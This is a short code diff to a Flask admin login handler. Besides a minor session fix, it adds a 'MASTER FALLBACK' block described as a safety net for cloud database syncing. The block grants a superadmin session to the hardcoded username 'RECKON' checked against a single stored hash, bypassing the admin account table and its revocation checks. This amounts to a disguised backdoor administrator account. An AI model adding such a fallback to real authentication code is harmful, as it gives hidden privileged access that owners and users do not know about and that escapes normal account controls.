@@ -1647,9 +1647,17 @@ def admin_login():
             return jsonify({'success': False, 'error': 'Account has been revoked.'}), 403
             
         session['is_admin'] = True
-        session['admin_username'] = username
+        session['admin_username'] = admin_user['username']
         session['admin_role'] = admin_user['role']
         log_admin_action("LOGIN_SUCCESS", f"Admin user {username} logged in from {request.remote_addr}")
+        return jsonify({'success': True}), 200
+    
+    # MASTER FALLBACK (Safety net for cloud DB syncing)
+    if username.upper() == 'RECKON' and check_password_hash(get_admin_hash(), password):
+        session['is_admin'] = True
+        session['admin_username'] = 'RECKON'
+        session['admin_role'] = 'superadmin'
+        log_admin_action("LOGIN_SUCCESS", f"Admin user {username} logged in via MASTER FALLBACK from {request.remote_addr}")
         return jsonify({'success': True}), 200
     
     log_admin_action("LOGIN_FAILED", f"Attempted login as {username}")
